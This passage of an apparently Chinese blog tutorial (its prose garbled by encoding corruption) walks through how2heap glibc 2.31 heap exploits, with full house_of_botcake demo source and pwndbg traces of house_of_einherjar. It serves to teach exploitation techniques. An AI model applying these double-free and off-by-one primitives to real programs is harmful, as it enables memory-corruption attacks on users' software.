class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559a00</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x555555559b20</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ä»æ­¤æ—¶çš„ unsortedbin ç»™ä»–åˆ†ä¸€å—å‡ºæ¥ï¼Œç„¶åä¿®æ”¹å…¶ fd çš„å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">64</span>     <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">  <span class="number">65</span>     <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">  <span class="number">66</span>     <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">â–º <span class="number">67</span>     <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">  <span class="number">68</span>     b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">69</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ­¤æ—¶æˆ‘ä»¬å°±æˆåŠŸæ±¡æŸ“äº† tachebin çš„å†…å®¹ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> â€”â–¸ <span class="number">0x7fffffffe260</span> â€”â–¸ <span class="number">0x555555554040</span> â—‚â€” <span class="number">0x400000006</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559b30</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x555555559b30</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥ç€åªéœ€è¦ä¸¤æ¬¡ malloc å°±èƒ½æ‹¿åˆ° 0x7fffffffe260 è¿™ä¸ªåœ°å€</p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h3><p>è¿™é‡Œå±•ç¤ºçš„æ˜¯é€šè¿‡ä¸€å­—èŠ‚æº¢å‡ºï¼Œå–åˆ°ä»»æ„åœ°å€çš„æŠ€æœ¯</p><p>é¦–å…ˆï¼Œåœ¨å †ä¸Šä¼ªé€ ä¸€ä¸ª chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ SOURCE (CODE) ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">35</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">36</span>     <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">   <span class="number">37</span></span><br><span class="line">   <span class="number">38</span>     <span class="comment">// create a fake chunk</span></span><br><span class="line">   <span class="number">39</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line"> â–º <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">   <span class="number">41</span></span><br><span class="line">   <span class="number">42</span>     a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">   <span class="number">43</span>     a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">   <span class="number">44</span>     a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">   <span class="number">45</span>     a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p>è¯¥ fake chunkç»“æ„å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; malloc_chunk -f &amp;a[<span class="number">0</span>]</span><br><span class="line">Fake chunk | Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5555555592a0</span></span><br><span class="line">prev_size: <span class="number">0x00</span></span><br><span class="line">size: <span class="number">0x60</span></span><br><span class="line">fd: <span class="number">0x5555555592a0</span></span><br><span class="line">bk: <span class="number">0x5555555592a0</span></span><br><span class="line">fd_nextsize: <span class="number">0x00</span></span><br><span class="line">bk_nextsize: <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åœ¨å †ä¸Šå¸ƒå±€ä¸¤ä¸ª chunk åˆ†åˆ«ä¸º b å’Œ c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæ­¤æ—¶å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª ä¸€å­—èŠ‚æº¢å‡º,kå¯ä»¥è¦†ç›–åˆ°, c chunk çš„size ä½ç½®ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">71</span>     <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">74</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> â–º <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">77</span>     b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">   <span class="number">78</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>     <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="number">81</span>            <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx b<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000101</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">1</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå½“æ‰§è¡Œå®Œä¹‹åï¼Œ c chunk çš„ prev_inused ä½å°†è¢«ç½®é›¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¼šå¯¼è‡´ chunk a è¢«è®¤ä¸ºæ˜¯ free çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Freed                <span class="number">0x0</span>               <span class="number">0x0</span></span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬åœ¨  chunk a çš„ä½ç½®æ”¾äº†ä¸€ä¸ª fake chunkï¼Œæˆ‘ä»¬æ­¤æ—¶ä¿®æ”¹äº† chunk cçš„size ä½ç½®ï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦å…¶ prev_size åˆæ³•ï¼Œæ‰€ä»¥ä¹Ÿè¦ä¿®æ”¹ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">83</span>     <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="number">84</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">  <span class="number">85</span>            <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">  <span class="number">86</span>     <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">â–º <span class="number">87</span>     <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="number">88</span>     *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°† chunk bçš„preve size ä¿®æ”¹ä¸º 0x60</p><p>ç´§æ¥ç€ï¼Œç…§æ ·å¡«æ»¡ tcache,  ç„¶åæˆ‘ä»¬å»free chunk cï¼Œç”±äº chunk c çš„ prev_inused ä¸º0ï¼Œåˆ™è®¤ä¸ºå‰é¢çš„ chunk æ˜¯free çš„æ­¤æ—¶ä¼šæœ‰ä¸€ä¸ªå‘å‰åˆå¹¶çš„è¿‡ç¨‹,è¿™æ ·æˆ‘ä»¬å°±ä¼šæœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘ fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rdi  <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x5555555592a8</span> â—‚â€” <span class="number">0x161</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x5555555592b0</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â€”â–¸ <span class="number">0x555555559b00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x5555555592c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x5555555592d8</span> â—‚â€” <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x5555555592a0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ­¤æ—¶å† malloc ä¸€ä¸ª 0x158 å¤§å°çš„chunk 